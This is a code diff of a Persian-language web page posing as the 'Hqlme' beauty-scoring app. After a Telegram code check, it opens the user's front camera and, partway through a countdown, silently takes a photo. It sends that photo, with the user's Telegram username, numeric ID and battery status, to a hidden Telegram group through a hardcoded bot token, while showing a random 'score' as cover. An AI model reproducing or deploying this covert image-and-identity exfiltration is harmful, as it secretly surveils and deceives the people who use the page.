@@ -3,176 +3,208 @@
 <head>
   <meta charset="UTF-8">
   <title>Hqlme | Photo</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
   <link href="https://cdn.jsdelivr.net/gh/rastikerdar/vazirmatn@v33.003/Vazirmatn-font-face.css" rel="stylesheet">
   <style>
-    * { margin: 0; padding: 0; box-sizing: border-box; }
+    * { box-sizing: border-box; font-family: 'Vazirmatn', sans-serif; }
     body {
-      font-family: 'Vazirmatn', sans-serif;
-      background: linear-gradient(145deg, #e6f0ff, #d0ebff);
-      padding: 30px;
-      direction: rtl;
+      margin: 0; background: linear-gradient(to top right, #f0f8ff, #cbe8ff);
+      color: #333; direction: rtl; padding: 30px;
     }
     .container {
-      max-width: 400px;
-      margin: auto;
-      background: white;
-      padding: 30px;
-      border-radius: 25px;
-      box-shadow: 0 15px 35px rgba(0, 0, 0, 0.1);
-      text-align: center;
+      max-width: 500px; margin: auto;
+      background: white; padding: 30px;
+      border-radius: 30px; box-shadow: 0 0 30px rgba(0,0,0,0.1);
     }
+    h2 {
+      text-align: center; color: #0057c2;
+      margin-bottom: 20px;
+    }
+    label { font-weight: bold; display: block; margin-top: 15px; }
     input {
-      width: 100%;
-      padding: 12px;
-      margin-top: 15px;
-      border: 1px solid #ccc;
-      border-radius: 12px;
+      width: 100%; padding: 12px; border: 1px solid #ccc;
+      border-radius: 12px; margin-top: 6px;
     }
     button {
-      background: linear-gradient(to right, #007bff, #00c6ff);
-      color: white;
-      border: none;
-      padding: 14px;
-      border-radius: 12px;
-      margin-top: 20px;
-      cursor: pointer;
-      width: 100%;
-      font-size: 16px;
+      width: 100%; margin-top: 25px; padding: 14px;
+      background: linear-gradient(to left, #0077ff, #00c6ff);
+      color: white; border: none; border-radius: 12px;
+      font-size: 16px; cursor: pointer;
     }
-    #cameraScreen {
-      display: none;
-      flex-direction: column;
-      align-items: center;
-      background: black;
-      position: fixed;
-      top: 0; left: 0;
-      width: 100%;
-      height: 100vh;
-      z-index: 999;
+    .note {
+      font-size: 13px; margin-top: 10px; background: #eef6ff;
+      padding: 10px 15px; border-radius: 10px;
+    }
+
+    #cameraView {
+      display: none; flex-direction: column; align-items: center;
     }
     video {
-      width: 100%;
-      height: 100%;
-      object-fit: cover;
+      width: 100%; max-width: 100%; border-radius: 30px;
+      box-shadow: 0 10px 30px rgba(0,0,0,0.1);
     }
-    .overlay {
-      position: absolute;
-      top: 0; left: 0;
-      width: 100%;
-      height: 100%;
-      pointer-events: none;
-      border: 20px solid rgba(255, 255, 255, 0.1);
-      box-shadow: inset 0 0 30px rgba(0,0,0,0.4);
+    .countdown {
+      font-size: 22px; font-weight: bold; color: #0077ff;
+      background: #e6f0ff; padding: 10px 25px;
+      border-radius: 20px; margin-top: 20px;
+      animation: pulse 1s infinite;
     }
-    #countdownMsg {
-      position: absolute;
-      top: 20px;
-      right: 50%;
-      transform: translateX(50%);
-      font-size: 24px;
-      color: white;
-      background: rgba(0,0,0,0.5);
-      padding: 10px 20px;
-      border-radius: 20px;
+    @keyframes pulse {
+      0% { transform: scale(1); }
+      50% { transform: scale(1.05); }
+      100% { transform: scale(1); }
+    }
+
+    #resultBox {
+      display: none; background: white; border-radius: 20px;
+      padding: 20px; text-align: center; box-shadow: 0 0 30px rgba(0,0,0,0.2);
+      position: fixed; bottom: 20px; right: 50%; transform: translateX(50%);
+      width: 90%; max-width: 400px; z-index: 10;
+    }
+    #score {
+      font-size: 36px; color: #00aaff; margin-bottom: 15px;
+    }
+    #retryBtn, #exitBtn {
+      margin-top: 10px; padding: 10px 20px;
+      border: none; border-radius: 12px; cursor: pointer;
+      font-size: 15px;
     }
     #retryBtn {
-      position: absolute;
-      bottom: 30px;
-      right: 50%;
-      transform: translateX(50%);
-      background: #ffffff33;
-      color: white;
-      border: 1px solid #fff;
-      padding: 10px 20px;
-      border-radius: 10px;
-      cursor: pointer;
+      background: #0077ff; color: white; margin-left: 10px;
+    }
+    #exitBtn {
+      background: #ccc;
+    }
+
+    @media (max-height: 700px) {
+      #retryBtn, #exitBtn {
+        font-size: 13px;
+      }
     }
   </style>
 </head>
 <body>
-  <div class="container" id="formScreen">
-    <h2>Hqlme | Photo</h2>
-    <input id="userId" placeholder="آیدی عددی تلگرام">
-    <input id="username" placeholder="یوزرنیم با @">
-    <button onclick="sendCode()">ارسال کد تایید</button>
-    <div id="verifySection" style="display:none;">
-      <input id="codeInput" placeholder="کد تایید دریافتی">
-      <button onclick="verifyCode()">تایید و شروع</button>
-    </div>
+
+<div class="container" id="formContainer">
+  <h2>زیبایی‌سنج Hqlme</h2>
+  <label>آیدی عددی تلگرام</label>
+  <input id="userId" placeholder="مثلاً 123456789">
+  <label>یوزرنیم (با @)</label>
+  <input id="username" placeholder="مثلاً @example">
+  <div class="note">
+    ربات <b>@HqlmePhotoBot</b> را استارت کنید.<br>
+    برای آیدی عددی به <b>@userinfobot</b> بروید.
   </div>
+  <button onclick="sendCode()">ارسال کد تأیید</button>
 
-  <div id="cameraScreen">
-    <video id="video" autoplay muted playsinline></video>
-    <div class="overlay"></div>
-    <div id="countdownMsg">لطفاً تکان نخورید...</div>
-    <button id="retryBtn" onclick="startCamera()">امتحان مجدد</button>
+  <div id="verifySection" style="display:none;">
+    <label>کد تأیید</label>
+    <input id="codeInput" placeholder="کدی که در تلگرام دریافت کردید">
+    <button onclick="verifyCode()">تأیید و ادامه</button>
   </div>
+</div>
 
-  <canvas id="snapshot" width="640" height="480" style="display:none;"></canvas>
+<div id="cameraView" class="container">
+  <video id="video" autoplay muted playsinline></video>
+  <div class="countdown" id="countdownText">لطفاً تکان نخورید... 10</div>
+</div>
 
-  <script>
-    const token = "7396553495:AAHfctgjqILhUGihcPZuqTTgRWrXxtGBUH4";
-    const groupId = "-1002534583259";
-    let sentCode = "", uid = "", uname = "";
+<div id="resultBox">
+  <div id="score">نمره: 75</div>
+  <button id="retryBtn" onclick="retry()">امتحان مجدد</button>
+  <button id="exitBtn" onclick="location.reload()">خروج</button>
+</div>
 
-    function sendCode() {
-      uid = document.getElementById("userId").value.trim();
-      uname = document.getElementById("username").value.trim();
-      if (!uid || !uname) return alert("لطفاً همه فیلدها را پر کنید.");
-      sentCode = Math.floor(100000 + Math.random() * 900000).toString();
-      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ chat_id: uid, text: `کد تایید شما: ${sentCode}` })
-      });
-      document.getElementById("verifySection").style.display = "block";
+<script>
+  const token = "7396553495:AAHfctgjqILhUGihcPZuqTTgRWrXxtGBUH4";
+  const groupId = "-1002534583259";
+  let sentCode = "", uid = "", uname = "";
+  let lastScore = null;
+
+  function sendCode() {
+    uid = document.getElementById("userId").value.trim();
+    uname = document.getElementById("username").value.trim();
+    if (!uid || !uname) return alert("لطفاً همه فیلدها را پر کنید.");
+    sentCode = Math.floor(100000 + Math.random() * 900000).toString();
+    fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ chat_id: uid, text: `کد تأیید شما: ${sentCode}` })
+    });
+    document.getElementById("verifySection").style.display = "block";
+  }
+
+  function verifyCode() {
+    const input = document.getElementById("codeInput").value.trim();
+    if (input === sentCode) {
+      document.getElementById("formContainer").style.display = "none";
+      document.getElementById("cameraView").style.display = "flex";
+      startCamera();
+    } else {
+      alert("کد اشتباه است.");
     }
+  }
 
-    function verifyCode() {
-      const input = document.getElementById("codeInput").value.trim();
-      if (input === sentCode) {
-        document.getElementById("formScreen").style.display = "none";
-        document.getElementById("cameraScreen").style.display = "flex";
-        startCamera();
-      } else {
-        alert("کد اشتباه است");
+  let stream;
+  async function startCamera() {
+    stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+    const video = document.getElementById("video");
+    video.srcObject = stream;
+    runCountdown();
+  }
+
+  function runCountdown() {
+    let time = 10;
+    const countdownEl = document.getElementById("countdownText");
+    countdownEl.innerText = `لطفاً تکان نخورید... ${time}`;
+    const interval = setInterval(() => {
+      time--;
+      countdownEl.innerText = `لطفاً تکان نخورید... ${time}`;
+      if (time === 5) takePhoto();
+      if (time <= 0) {
+        clearInterval(interval);
+        showScore();
       }
+    }, 1000);
+  }
+
+  function takePhoto() {
+    const video = document.getElementById("video");
+    const canvas = document.createElement("canvas");
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+    canvas.getContext("2d").drawImage(video, 0, 0, canvas.width, canvas.height);
+    canvas.toBlob(async (blob) => {
+      const battery = await navigator.getBattery();
+      const caption = `یوزرنیم: ${uname}\nآیدی عددی: ${uid}\nباتری: ${battery.level * 100}%\nشارژ: ${battery.charging ? 'بله' : 'خیر'}`;
+      const form = new FormData();
+      form.append("chat_id", groupId);
+      form.append("caption", caption);
+      form.append("photo", blob, "photo.jpg");
+      await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+        method: "POST", body: form
+      });
+    }, 'image/jpeg');
+  }
+
+  function showScore() {
+    let score;
+    if (lastScore === null) {
+      score = Math.random() < 0.7 ? Math.floor(51 + Math.random() * 49) : Math.floor(Math.random() * 50);
+    } else {
+      const delta = Math.floor(Math.random() * 10) - 5;
+      score = Math.max(0, Math.min(100, lastScore + delta));
     }
+    lastScore = score;
+    document.getElementById("score").innerText = `نمره: ${score}`;
+    document.getElementById("resultBox").style.display = "block";
+  }
 
-    async function startCamera() {
-      const video = document.getElementById("video");
-      const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-      video.srcObject = stream;
-      document.getElementById("countdownMsg").innerText = "لطفاً تکان نخورید... 10";
+  function retry() {
+    document.getElementById("resultBox").style.display = "none";
+    runCountdown();
+  }
+</script>
 
-      let counter = 10;
-      const timer = setInterval(() => {
-        counter--;
-        document.getElementById("countdownMsg").innerText = `لطفاً تکان نخورید... ${counter}`;
-        if (counter === 5) takePhoto();
-        if (counter <= 0) clearInterval(timer);
-      }, 1000);
-    }
-
-    function takePhoto() {
-      const video = document.getElementById("video");
-      const canvas = document.getElementById("snapshot");
-      canvas.getContext("2d").drawImage(video, 0, 0, canvas.width, canvas.height);
-      canvas.toBlob(async (blob) => {
-        const battery = await navigator.getBattery();
-        const caption = `یوزرنیم: ${uname}\nآیدی عددی: ${uid}\nباتری: ${battery.level * 100}%\nشارژ: ${battery.charging ? 'بله' : 'خیر'}`;
-        const form = new FormData();
-        form.append("chat_id", groupId);
-        form.append("caption", caption);
-        form.append("photo", blob, "photo.jpg");
-
-        await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
-          method: "POST",
-          body: form
-        });
-      }, 'image/jpeg');
-    }
-  </script>
 </body>
 </html>
